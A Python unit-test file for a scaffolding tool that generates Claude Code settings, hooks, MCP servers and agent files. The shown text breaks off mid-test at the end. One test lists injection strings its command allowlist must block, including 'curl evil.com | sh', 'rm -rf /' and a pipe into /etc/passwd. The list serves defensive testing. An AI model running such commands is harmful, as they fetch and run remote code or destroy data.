#!/usr/bin/env python3
"""Tests for claude-launchpad scaffold.py"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from argparse import Namespace
from pathlib import Path

# Import from scaffold.py
sys.path.insert(0, str(Path(__file__).parent))
from scaffold import (
    SAFE_CMD_PATTERN,
    PROJECT_NAME_PATTERN,
    MCP_VERSIONS,
    MCP_CONTEXT_COST,
    VALID_SETTINGS_KEYS,
    PRESETS,
    VERSION,
    get_skills,
    get_mcp_servers,
    get_hooks,
    get_agents,
    get_rules,
    get_claudeignore,
    get_env_example,
    get_handoff,
    get_first_feature_guide,
    get_github_actions_ci,
    get_gitlab_ci,
    get_pr_template,
    safe_write,
    merge_settings,
    validate_settings,
    verify_scaffold,
    print_token_summary,
    upgrade,
    scaffold,
)


def make_args(**overrides):
    """Create a Namespace with sensible defaults for testing."""
    defaults = {
        "project_name": "test-app",
        "frontend": "nextjs",
        "backend": "integrated",
        "database": "postgresql",
        "auth": "none",
        "hosting": "none",
        "git_platform": "none",
        "ai": False,
        "team": False,
        "tdd": False,
        "conventional_commits": False,
        "lint_cmd": None,
        "test_cmd": None,
        "dev_cmd": None,
        "build_cmd": None,
        "migrate_cmd": None,
        "orm": "none",
        "ci_cd": "none",
        "sentry": False,
        "context7": False,
        "sequential_thinking": False,
        "minimal_mcp": False,
        "verify": False,
        "preset": None,
        "dry_run": False,
        "force": False,
        "update": False,
        "output_dir": ".",
        "create_root": False,
    }
    defaults.update(overrides)
    return Namespace(**defaults)


class TestProjectNameValidation(unittest.TestCase):
    """Test project name regex validation."""

    def test_valid_names(self):
        valid = ["my-app", "app123", "my_project", "a", "My.App", "project-v2.0"]
        for name in valid:
            self.assertTrue(PROJECT_NAME_PATTERN.match(name), f"Should be valid: {name}")

    def test_invalid_names(self):
        invalid = ["-leading-dash", ".leading-dot", "_leading-underscore",
                    "has space", "has/slash", "", "special@char"]
        for name in invalid:
            self.assertFalse(PROJECT_NAME_PATTERN.match(name), f"Should be invalid: {name}")


class TestSafeCmdPattern(unittest.TestCase):
    """Test command allowlist regex for injection prevention."""

    def test_allowed_npm_commands(self):
        allowed = [
            "npm run lint",
            "npm run test",
            "npm run lint -- --fix",
            "npm run test -- --coverage",
            "npx tsc --noEmit",
            "pnpm run lint",
            "yarn run test",
            "bun run lint",
        ]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_allowed_python_commands(self):
        allowed = [
            "pytest",
            "pytest app/",
            "pytest --verbose",
            "ruff check .",
            "ruff check . --fix",
            "mypy app/",
            "black .",
            "flake8 src/",
            "pylint app/",
            "isort .",
        ]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_allowed_go_commands(self):
        allowed = ["go test ./...", "go vet ./...", "go fmt ./...", "golangci-lint run"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_allowed_rust_commands(self):
        allowed = ["cargo test", "cargo clippy", "cargo fmt", "cargo check"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_allowed_make_commands(self):
        allowed = ["make lint", "make test", "make check"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_blocked_injection_attempts(self):
        blocked = [
            "rm -rf /",
            "curl evil.com | sh",
            "npm run lint && rm -rf /",
            "npm run lint; echo pwned",
            "npm run lint; rm -rf /",
            "$(rm -rf /)",
            "echo pwned",
            "python -c 'import os'",
            "; ls",
            "npm run lint | tee /etc/passwd",
        ]
        for cmd in blocked:
            self.assertFalse(SAFE_CMD_PATTERN.match(cmd), f"Should be blocked: {cmd}")


class TestSafeWrite(unittest.TestCase):
    """Test safe_write file protection logic."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_creates_new_file(self):
        fp = self.tmpdir / "test.md"
        result = safe_write(fp, "content")
        self.assertEqual(result, "created")
        self.assertEqual(fp.read_text(), "content")

    def test_skips_existing_file_by_default(self):
        fp = self.tmpdir / "test.md"
        fp.write_text("original")
        result = safe_write(fp, "new content")
        self.assertEqual(result, "skipped")
        self.assertEqual(fp.read_text(), "original")

    def test_force_overwrites_existing(self):
        fp = self.tmpdir / "test.md"
        fp.write_text("original")
        result = safe_write(fp, "new content", force=True)
        self.assertEqual(result, "overwritten")
        self.assertEqual(fp.read_text(), "new content")

    def test_handles_write_error(self):
        # Try to write to a non-existent directory
        fp = self.tmpdir / "nonexistent" / "dir" / "test.md"
        result = safe_write(fp, "content")
        # Should return "skipped" since file doesn't exist and write fails
        # Actually, it won't exist so it'll try to write and fail
        # The file doesn't exist → existed=False → tries to write → OSError → "skipped"
        self.assertEqual(result, "skipped")


class TestMergeSettings(unittest.TestCase):
    """Test settings.json merge logic."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_merge_adds_new_mcp_servers(self):
        settings_path = self.tmpdir / "settings.json"
        settings_path.write_text(json.dumps({
            "mcpServers": {"github": {"command": "npx", "args": ["-y", "server-github"]}}
        }))
        new_settings = {
            "mcpServers": {
                "github": {"command": "npx", "args": ["different"]},  # existing — should NOT override
                "database": {"command": "npx", "args": ["-y", "server-postgres"]}  # new
            }
        }
        merged, changes = merge_settings(settings_path, new_settings)
        self.assertIn("database", merged["mcpServers"])
        self.assertEqual(merged["mcpServers"]["github"]["args"], ["-y", "server-github"])  # unchanged
        self.assertEqual(len(changes), 1)
        self.assertIn("database", changes[0])

    def test_merge_adds_new_hook_types(self):
        settings_path = self.tmpdir / "settings.json"
        settings_path.write_text(json.dumps({
            "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "block", "pattern": "rm -rf"}]}]}
        }))
        new_settings = {
            "hooks": {
                "PostToolUse": [{"matcher": "Write|Edit", "hooks": [{"type": "command", "command": "npm run lint"}]}]
            }
        }
        merged, changes = merge_settings(settings_path, new_settings)
        self.assertIn("PreToolUse", merged["hooks"])  # preserved
        self.assertIn("PostToolUse", merged["hooks"])  # added
        self.assertTrue(any("PostToolUse" in c for c in changes))

    def test_merge_skips_duplicate_hook_matchers(self):
        settings_path = self.tmpdir / "settings.json"
        settings_path.write_text(json.dumps({
            "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "block", "pattern": "old"}]}]}
        }))
        new_settings = {
            "hooks": {
                "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "block", "pattern": "new"}]}]
            }
        }
        merged, changes = merge_settings(settings_path, new_settings)
        # Should NOT add duplicate Bash matcher
        bash_hooks = [h for h in merged["hooks"]["PreToolUse"] if h.get("matcher") == "Bash"]
        self.assertEqual(len(bash_hooks), 1)
        self.assertEqual(bash_hooks[0]["hooks"][0]["pattern"], "old")  # original preserved

    def test_merge_handles_missing_file(self):
        settings_path = self.tmpdir / "nonexistent.json"
        new_settings = {"mcpServers": {"github": {"command": "npx"}}}
        merged, changes = merge_settings(settings_path, new_settings)
        self.assertEqual(merged, new_settings)
        self.assertIn("Created new", changes[0])

    def test_merge_handles_invalid_json(self):
        settings_path = self.tmpdir / "settings.json"
        settings_path.write_text("not json {{{")
        new_settings = {"mcpServers": {"github": {"command": "npx"}}}
        merged, changes = merge_settings(settings_path, new_settings)
        self.assertEqual(merged, new_settings)


class TestGetSkills(unittest.TestCase):
    """Test skill generation based on interview answers."""

    def test_minimal_stack_generates_base_skills(self):
        args = make_args(frontend="none", backend="none", database="none")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("simplify", names)
        self.assertIn("generate-feature", names)
        # No frontend/backend/db skills
        self.assertNotIn("generate-component", names)
        self.assertNotIn("generate-endpoint", names)
        self.assertNotIn("generate-model", names)

    def test_nextjs_generates_frontend_skills(self):
        args = make_args(frontend="nextjs")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("generate-component", names)
        self.assertIn("generate-page", names)
        self.assertIn("generate-endpoint", names)  # nextjs integrated API

    def test_express_backend_generates_endpoint_skill(self):
        args = make_args(frontend="none", backend="node-express")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("generate-endpoint", names)
        content = dict(skills)["generate-endpoint"]
        self.assertIn("Express", content)

    def test_database_generates_model_and_crud_skills(self):
        args = make_args(database="postgresql")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("generate-model", names)
        self.assertIn("generate-crud", names)

    def test_auth_generates_protected_route_skill(self):
        args = make_args(auth="clerk")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("add-protected-route", names)
        content = dict(skills)["add-protected-route"]
        self.assertIn("clerk", content)

    def test_ai_flag_generates_ai_skills(self):
        args = make_args(ai=True)
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("prompt-engineer", names)
        self.assertIn("add-ai-feature", names)

    def test_skills_have_yaml_frontmatter(self):
        args = make_args(frontend="nextjs", database="postgresql", auth="clerk", ai=True)
        skills = get_skills(args)
        for name, content in skills:
            self.assertTrue(content.strip().startswith("---"),
                          f"Skill '{name}' missing YAML frontmatter")

    def test_no_ai_flag_skips_ai_skills(self):
        args = make_args(ai=False)
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertNotIn("prompt-engineer", names)
        self.assertNotIn("add-ai-feature", names)


class TestGetMcpServers(unittest.TestCase):
    """Test MCP server configuration generation."""

    def test_github_platform_adds_github_mcp(self):
        args = make_args(git_platform="github")
        servers = get_mcp_servers(args)
        self.assertIn("github", servers)
        self.assertEqual(servers["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"], "${GITHUB_TOKEN}")

    def test_gitlab_platform_adds_gitlab_mcp(self):
        args = make_args(git_platform="gitlab")
        servers = get_mcp_servers(args)
        self.assertIn("gitlab", servers)

    def test_postgresql_adds_database_mcp(self):
        args = make_args(database="postgresql")
        servers = get_mcp_servers(args)
        self.assertIn("database", servers)
        self.assertIn("server-postgres", servers["database"]["args"][1])

    def test_sqlite_adds_database_mcp(self):
        args = make_args(database="sqlite")
        servers = get_mcp_servers(args)
        self.assertIn("database", servers)
        self.assertIn("server-sqlite", servers["database"]["args"][1])

    def test_no_mcp_for_mongodb(self):
        args = make_args(database="mongodb", git_platform="none")
        servers = get_mcp_servers(args)
        self.assertNotIn("database", servers)

    def test_sentry_flag_adds_sentry_mcp(self):
        args = make_args(sentry=True)
        servers = get_mcp_servers(args)
        self.assertIn("sentry", servers)

    def test_no_hardcoded_secrets(self):
        args = make_args(git_platform="github", database="postgresql", sentry=True)
        servers = get_mcp_servers(args)
        for name, config in servers.items():
            for env_key, env_val in config.get("env", {}).items():
                self.assertTrue(env_val.startswith("${"),
                              f"MCP server '{name}' env var '{env_key}' should use ${{}} syntax, got: {env_val}")


class TestGetHooks(unittest.TestCase):
    """Test hook generation."""

    def test_always_generates_force_push_block(self):
        args = make_args()
        hooks = get_hooks(args)
        pre_hooks = hooks.get("PreToolUse", [])
        force_push_hooks = [h for h in pre_hooks
                           if "force" in str(h.get("hooks", [{}])[0].get("pattern", ""))]
        self.assertTrue(len(force_push_hooks) > 0, "Should have force-push block hook")

    def test_always_generates_secret_block(self):
        args = make_args()
        hooks = get_hooks(args)
        pre_hooks = hooks.get("PreToolUse", [])
        secret_hooks = [h for h in pre_hooks
                       if "sk-" in str(h.get("hooks", [{}])[0].get("pattern", ""))]
        self.assertTrue(len(secret_hooks) > 0, "Should have secret block hook")

    def test_secret_hook_scoped_to_bash(self):
        """Secret detection should be on Bash (git commands), not Write|Edit."""
        args = make_args()
        hooks = get_hooks(args)
        pre_hooks = hooks.get("PreToolUse", [])
        for h in pre_hooks:
            pattern = h.get("hooks", [{}])[0].get("pattern", "")
            if "sk-" in pattern:
                self.assertEqual(h["matcher"], "Bash",
                               "Secret detection hook should use Bash matcher, not Write|Edit")

    def test_conventional_commits_only_when_enabled(self):
        args_off = make_args(conventional_commits=False)
        hooks_off = get_hooks(args_off)
        pre_off = hooks_off.get("PreToolUse", [])
        conv_off = [h for h in pre_off if "feat" in str(h)]
        self.assertEqual(len(conv_off), 0)

        args_on = make_args(conventional_commits=True)
        hooks_on = get_hooks(args_on)
        pre_on = hooks_on.get("PreToolUse", [])
        conv_on = [h for h in pre_on if "feat" in str(h)]
        self.assertTrue(len(conv_on) > 0)

    def test_conventional_commits_allows_amend(self):
        """Conventional commits hook should not block git commit --amend."""
        args = make_args(conventional_commits=True)
        hooks = get_hooks(args)
        pre_hooks = hooks.get("PreToolUse", [])
        for h in pre_hooks:
            pattern_str = h.get("hooks", [{}])[0].get("pattern", "")
            if "feat" in pattern_str:
                # Pattern should only match git commit -m, not --amend
                pat = re.compile(pattern_str)
                self.assertIsNone(pat.search('git commit --amend'))
                self.assertIsNone(pat.search('git commit -F msg.txt'))
                self.assertIsNone(pat.search('git commit'))  # editor mode

    def test_lint_cmd_rejected_if_unsafe(self):
        args = make_args(lint_cmd="rm -rf /")
        hooks = get_hooks(args)
        # Should NOT have PostToolUse hooks (unsafe command rejected)
        self.assertNotIn("PostToolUse", hooks)

    def test_lint_cmd_accepted_if_safe(self):
        args = make_args(lint_cmd="npm run lint")
        hooks = get_hooks(args)
        post_hooks = hooks.get("PostToolUse", [])
        self.assertTrue(len(post_hooks) > 0)
        cmd = post_hooks[0]["hooks"][0]["command"]
        self.assertIn("npm run lint", cmd)

    def test_lint_hook_uses_jq_file_filter(self):
        """PostToolUse hooks should use jq to extract file path from stdin JSON."""
        args = make_args(lint_cmd="npm run lint")
        hooks = get_hooks(args)
        post_hooks = hooks.get("PostToolUse", [])
        cmd = post_hooks[0]["hooks"][0]["command"]
        self.assertIn("jq", cmd)
        self.assertIn("tool_input.file_path", cmd)

    def test_lint_hook_has_jq_guard(self):
        """PostToolUse hooks should fall back gracefully if jq is missing."""
        args = make_args(lint_cmd="npm run lint")
        hooks = get_hooks(args)
        post_hooks = hooks.get("PostToolUse", [])
        cmd = post_hooks[0]["hooks"][0]["command"]
        self.assertIn("command -v jq", cmd)
        self.assertIn("cat >/dev/null", cmd)  # drain stdin if jq missing

    def test_lint_hook_skips_non_source_files(self):
        """PostToolUse hooks should skip .md, .json, etc."""
        args = make_args(lint_cmd="npm run lint")
        hooks = get_hooks(args)
        post_hooks = hooks.get("PostToolUse", [])
        cmd = post_hooks[0]["hooks"][0]["command"]
        self.assertIn("*.md", cmd)
        self.assertIn("*.json", cmd)
        self.assertIn("exit 0", cmd)

    def test_test_cmd_requires_tdd_flag(self):
        args = make_args(tdd=False, test_cmd="npm run test")
        hooks = get_hooks(args)
        self.assertNotIn("PostToolUse", hooks)

    def test_test_cmd_with_tdd_flag(self):
        args = make_args(tdd=True, test_cmd="npm run test")
        hooks = get_hooks(args)
        post_hooks = hooks.get("PostToolUse", [])
        self.assertTrue(len(post_hooks) > 0)

    def test_stop_hook_always_present(self):
        args = make_args()
        hooks = get_hooks(args)
        self.assertIn("Stop", hooks)

    def test_stop_hook_is_conditional(self):
        """Stop hook should check handoff.md age, not fire unconditionally."""
        args = make_args()
        hooks = get_hooks(args)
        stop_cmd = hooks["Stop"][0]["hooks"][0]["command"]
        self.assertIn("mmin", stop_cmd, "Stop hook should check file modification time")


class TestGetSupportingFiles(unittest.TestCase):
    """Test supporting file generators."""

    def test_claudeignore_has_essentials(self):
        content = get_claudeignore("nextjs", "integrated")
        self.assertIn("node_modules/", content)
        self.assertIn(".env", content)
        self.assertIn("dist/", content)
        self.assertIn(".next/", content)

    def test_env_example_includes_db_vars(self):
        content = get_env_example("postgresql", "none", False)
        self.assertIn("DATABASE_URL", content)
        self.assertIn("postgresql://", content)

    def test_env_example_includes_auth_vars(self):
        content = get_env_example("none", "clerk", False)
        self.assertIn("CLERK_SECRET_KEY", content)

    def test_env_example_includes_ai_vars(self):
        content = get_env_example("none", "none", True)
        self.assertIn("ANTHROPIC_API_KEY", content)

    def test_handoff_includes_project_name(self):
        content = get_handoff("my-cool-app")
        self.assertIn("my-cool-app", content)


class TestScaffoldEndToEnd(unittest.TestCase):
    """End-to-end scaffold tests."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_blank_project_creates_everything(self):
        args = make_args(
            output_dir=str(self.tmpdir),
            create_root=True,
            frontend="nextjs",
            backend="integrated",
            database="postgresql",
            git_platform="github",
        )
        result = scaffold(args)
        self.assertEqual(result, 0)

        project_dir = self.tmpdir / "test-app"
        self.assertTrue((project_dir / ".claude" / "commands" / "status.md").exists())
        self.assertTrue((project_dir / ".claude" / "commands" / "handoff.md").exists())
        self.assertTrue((project_dir / ".claude" / "skills" / "simplify.md").exists())
        self.assertTrue((project_dir / ".claude" / "settings.json").exists())
        self.assertTrue((project_dir / "CLAUDE.md").exists())
        self.assertTrue((project_dir / "ARCHITECTURE.md").exists())
        self.assertTrue((project_dir / ".claudeignore").exists())
        self.assertTrue((project_dir / ".env.example").exists())
        self.assertTrue((project_dir / ".claude" / "handoff.md").exists())

    def test_settings_json_valid(self):
        args = make_args(
            output_dir=str(self.tmpdir),
            create_root=True,
            git_platform="github",
            database="postgresql",
            sentry=True,
            conventional_commits=True,
            lint_cmd="npm run lint",
            tdd=True,
            test_cmd="npm run test",
        )
        scaffold(args)

        settings_path = self.tmpdir / "test-app" / ".claude" / "settings.json"
        data = json.loads(settings_path.read_text())

        # Valid JSON structure
        self.assertIn("hooks", data)
        self.assertIn("mcpServers", data)
        self.assertIn("PreToolUse", data["hooks"])
        self.assertIn("PostToolUse", data["hooks"])
        self.assertIn("Stop", data["hooks"])
        self.assertIn("github", data["mcpServers"])
        self.assertIn("database", data["mcpServers"])
        self.assertIn("sentry", data["mcpServers"])

    def test_skip_mode_preserves_existing(self):
        project_dir = self.tmpdir / "test-app"
        project_dir.mkdir()
        (project_dir / ".claude" / "commands").mkdir(parents=True)
        (project_dir / ".claude" / "commands" / "status.md").write_text("custom content")

        args = make_args(output_dir=str(self.tmpdir / "test-app"))
        scaffold(args)

        # Original file should be preserved
        content = (project_dir / ".claude" / "commands" / "status.md").read_text()
        self.assertEqual(content, "custom content")

    def test_force_mode_overwrites(self):
        project_dir = self.tmpdir / "test-app"
        project_dir.mkdir()
        (project_dir / ".claude" / "commands").mkdir(parents=True)
        (project_dir / ".claude" / "commands" / "status.md").write_text("custom content")

        args = make_args(output_dir=str(self.tmpdir / "test-app"), force=True)
        scaffold(args)

        content = (project_dir / ".claude" / "commands" / "status.md").read_text()
        self.assertNotEqual(content, "custom content")
        self.assertIn("project status", content)

    def test_force_and_update_mutually_exclusive(self):
        args = make_args(
            output_dir=str(self.tmpdir),
            create_root=True,
            force=True,
            update=True,
        )
        result = scaffold(args)
        self.assertEqual(result, 1)

    def test_update_mode_merges_settings(self):
        project_dir = self.tmpdir / "test-app"
        project_dir.mkdir()
        (project_dir / ".claude").mkdir()
        settings_path = project_dir / ".claude" / "settings.json"
        settings_path.write_text(json.dumps({
            "mcpServers": {"custom": {"command": "node", "args": ["server.js"]}}
        }))

        args = make_args(
            output_dir=str(self.tmpdir / "test-app"),
            update=True,
            git_platform="github",
        )
        scaffold(args)

        data = json.loads(settings_path.read_text())
        self.assertIn("custom", data["mcpServers"])  # preserved
        self.assertIn("github", data["mcpServers"])   # added

    def test_tdd_flag_adds_tdd_command(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, tdd=True)
        scaffold(args)
        self.assertTrue((self.tmpdir / "test-app" / ".claude" / "commands" / "tdd.md").exists())

    def test_team_flag_adds_pipeline_command(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, team=True)
        scaffold(args)
        self.assertTrue((self.tmpdir / "test-app" / ".claude" / "commands" / "pipeline.md").exists())

    def test_config_metadata_written(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True)
        scaffold(args)
        config_path = self.tmpdir / "test-app" / ".claude" / "launchpad-config.json"
        self.assertTrue(config_path.exists())
        data = json.loads(config_path.read_text())
        self.assertEqual(data["project_name"], "test-app")
        self.assertEqual(data["version"], "5.0.0")
        self.assertIn("scaffolded_at", data)


class TestDryRun(unittest.TestCase):
    """Test --dry-run mode."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_dry_run_creates_no_files(self):
        args = make_args(
            output_dir=str(self.tmpdir),
            create_root=True,
            dry_run=True,
        )
        scaffold(args)

        project_dir = self.tmpdir / "test-app"
        # In dry-run mode, no files should be created
        self.assertFalse(project_dir.exists())

    def test_dry_run_returns_zero(self):
        args = make_args(
            output_dir=str(self.tmpdir),
            create_root=True,
            dry_run=True,
        )
        result = scaffold(args)
        self.assertEqual(result, 0)


class TestValidateSettings(unittest.TestCase):
    """Test settings.json schema validation."""

    def test_valid_settings_no_warnings(self):
        settings = {
            "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "block", "pattern": "rm"}]}]},
            "mcpServers": {"github": {"command": "npx", "args": ["-y", "server"]}}
        }
        warnings = validate_settings(settings)
        self.assertEqual(len(warnings), 0)

    def test_unknown_top_level_key(self):
        settings = {"hooks": {}, "badKey": True}
        warnings = validate_settings(settings)
        self.assertTrue(any("badKey" in w for w in warnings))

    def test_unknown_hook_type(self):
        settings = {"hooks": {"BadHookType": []}}
        warnings = validate_settings(settings)
        self.assertTrue(any("BadHookType" in w for w in warnings))

    def test_mcp_missing_command(self):
        settings = {"mcpServers": {"broken": {"args": []}}}
        warnings = validate_settings(settings)
        self.assertTrue(any("command" in w for w in warnings))


class TestMcpVersionsPinned(unittest.TestCase):
    """Test that MCP packages use pinned versions."""

    def test_all_mcp_servers_use_pinned_versions(self):
        args = make_args(git_platform="github", database="postgresql", sentry=True)
        servers = get_mcp_servers(args)
        for name, config in servers.items():
            for arg in config.get("args", []):
                if "@modelcontextprotocol" in str(arg):
                    self.assertRegex(arg, r'@\d+\.\d+\.\d+$',
                                    f"MCP server '{name}' should use pinned version: {arg}")


class TestNewStacks(unittest.TestCase):
    """Test new backend stack support."""

    def test_rust_actix_generates_endpoint_skill(self):
        args = make_args(frontend="none", backend="rust-actix")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("generate-endpoint", names)
        content = dict(skills)["generate-endpoint"]
        self.assertIn("Actix-web", content)

    def test_ruby_rails_generates_endpoint_skill(self):
        args = make_args(frontend="none", backend="ruby-rails")
        skills = get_skills(args)
        names = [s[0] for s in skills]
        self.assertIn("generate-endpoint", names)
        content = dict(skills)["generate-endpoint"]
        self.assertIn("Rails", content)

    def test_safe_cmd_allows_rails_commands(self):
        allowed = ["bundle exec rubocop", "bundle exec rspec", "rails test", "rails db:migrate"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_safe_cmd_allows_flutter_commands(self):
        allowed = ["flutter test", "flutter analyze", "flutter build"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")


class TestManifest(unittest.TestCase):
    """Test manifest file creation."""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_manifest_created(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True)
        scaffold(args)
        manifest_path = self.tmpdir / "test-app" / ".claude" / "launchpad-manifest.json"
        self.assertTrue(manifest_path.exists())
        data = json.loads(manifest_path.read_text())
        self.assertIn("files", data)
        self.assertIn("version", data)
        self.assertTrue(len(data["files"]) > 0)

    def test_manifest_not_created_in_dry_run(self):
        args = make_args(output_dir=str(self.tmpdir), create_root=True, dry_run=True)
        scaffold(args)
        project_dir = self.tmpdir / "test-app"
        self.assertFalse(project_dir.exists())


class TestGetAgents(unittest.TestCase):
    """Test agent generation based on interview answers."""

    def test_always_generates_core_agents(self):
        args = make_args()
        agents = get_agents(args)
        names = [a[0] for a in agents]
        self.assertIn("architect", names)
        self.assertIn("testing", names)
        self.assertIn("reviewer", names)
        self.assertIn("debugger", names)
        self.assertIn("push", names)

    def test_security_agent_when_auth(self):
        args = make_args(auth="clerk")
        agents = get_agents(args)
        names = [a[0] for a in agents]
        self.assertIn("security", names)

    def test_no_security_agent_when_no_auth(self):
        args = make_args(auth="none", ai=False)
        agents = get_agents(args)
        names = [a[0] for a in agents]
        self.assertNotIn("security", names)

    def test_agents_have_yaml_frontmatter(self):
        args = make_args(auth="clerk")
        agents = get_agents(args)
        for name, content in agents:
            self.assertTrue(content.strip().startswith("---"),
                          f"Agent '{name}' missing YAML frontmatter")

    def test_agents_include_stack_info(self):
        args = make_args(frontend="react-vite", backend="python-fastapi")
        agents = get_agents(args)
        architect_content = dict(agents)["architect"]
        self.assertIn("react-vite", architect_content)
        self.assertIn("python-fastapi", architect_content)

    def test_agents_include_test_cmd(self):
        args = make_args(test_cmd="pytest -v")
        agents = get_agents(args)
        testing_content = dict(agents)["testing"]
        self.assertIn("pytest -v", testing_content)

    def test_push_agent_respects_conventional_commits(self):
        args = make_args(conventional_commits=True)
        agents = get_agents(args)
        push_content = dict(agents)["push"]
        self.assertIn("Conventional", push_content)

    def test_agents_have_stop_conditions(self):
        args = make_args(auth="clerk")
        agents = get_agents(args)
        for name, content in agents:
            self.assertIn("STOP", content,
                        f"Agent '{name}' should have a STOP condition")


class TestGetRules(unittest.TestCase):
    """Test rule generation based on interview answers."""

    def test_nextjs_generates_frontend_rule(self):
        args = make_args(frontend="nextjs")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertIn("frontend", names)
        content = dict(rules)["frontend"]
        self.assertIn("Server Components", content)

    def test_react_vite_generates_frontend_rule(self):
        args = make_args(frontend="react-vite")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertIn("frontend", names)

    def test_fastapi_generates_backend_rule(self):
        args = make_args(frontend="none", backend="python-fastapi")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertIn("backend", names)
        content = dict(rules)["backend"]
        self.assertIn("Pydantic", content)

    def test_go_generates_backend_rule(self):
        args = make_args(frontend="none", backend="go")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertIn("backend", names)
        content = dict(rules)["backend"]
        self.assertIn("Context", content)

    def test_prisma_generates_database_rule(self):
        args = make_args(database="postgresql", orm="prisma")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertIn("database", names)
        content = dict(rules)["database"]
        self.assertIn("Prisma", content)

    def test_no_db_rule_without_orm(self):
        args = make_args(database="postgresql", orm="none")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertNotIn("database", names)

    def test_no_frontend_rule_when_none(self):
        args = make_args(frontend="none")
        rules = get_rules(args)
        names = [r[0] for r in rules]
        self.assertNotIn("frontend", names)

    def test_rules_have_yaml_frontmatter(self):
        args = make_args(frontend="nextjs", backend="python-fastapi", orm="prisma")
        rules = get_rules(args)
        for name, content in rules:
            self.assertTrue(content.strip().startswith("---"),
                          f"Rule '{name}' missing YAML frontmatter")

    def test_rules_have_globs(self):
        args = make_args(frontend="nextjs")
        rules = get_rules(args)
        content = dict(rules)["frontend"]
        self.assertIn("globs:", content)


class TestCommunityMcp(unittest.TestCase):
    """Test community MCP server support."""

    def test_context7_flag(self):
        args = make_args(context7=True)
        servers = get_mcp_servers(args)
        self.assertIn("context7", servers)

    def test_sequential_thinking_flag(self):
        args = make_args(sequential_thinking=True)
        servers = get_mcp_servers(args)
        self.assertIn("sequential-thinking", servers)

    def test_minimal_mcp_skips_community(self):
        args = make_args(context7=True, sequential_thinking=True, minimal_mcp=True)
        servers = get_mcp_servers(args)
        self.assertNotIn("context7", servers)
        self.assertNotIn("sequential-thinking", servers)

    def test_minimal_mcp_keeps_essential(self):
        args = make_args(git_platform="github", minimal_mcp=True)
        servers = get_mcp_servers(args)
        self.assertIn("github", servers)


class TestNewSafeCmdPatterns(unittest.TestCase):
    """Test extended SAFE_CMD_PATTERN for new command types."""

    def test_dev_commands(self):
        allowed = [
            "uvicorn app.main:app --reload",
            "uvicorn app.main:app --host 0.0.0.0 --port 8000",
            "cargo run",
            "flutter run",
            "rails server",
        ]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_migration_commands(self):
        allowed = [
            "npx prisma migrate dev",
            "npx prisma migrate deploy",
            "npx prisma generate",
            "npx prisma db push",
            "npx drizzle-kit generate",
            "npx drizzle-kit migrate",
            "alembic upgrade head",
            "alembic downgrade -1",
        ]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")

    def test_build_commands(self):
        allowed = ["cargo build", "cargo build --release"]
        for cmd in allowed:
            self.assertTrue(SAFE_CMD_PATTERN.match(cmd), f"Should be allowed: {cmd}")


class TestEnhancedSkills(unittest.TestCase):
    """Test that skills include verification and anti-pattern sections."""

    def test_skills_have_verify_section(self):
        args = make_args(frontend="nextjs", database="postgresql")
        skills = get_skills(args)
        for name, content in skills:
            self.assertIn("Verify:", content,
                        f"Skill '{name}' missing Verify section")

    def test_skills_have_anti_patterns(self):
        args = make_args(frontend="nextjs", database="postgresql")
        skills = get_skills(args)
        for name, content in skills:
            self.assertIn("Anti-patterns:", content,
                        f"Skill '{name}' missing Anti-patterns section")


class TestFirstFeatureGuide(unittest.TestCase):
    """Test first-feature guide generation."""

    def test_guide_includes_project_name(self):
        args = make_args(project_name="my-app")
        guide = get_first_feature_guide(args)
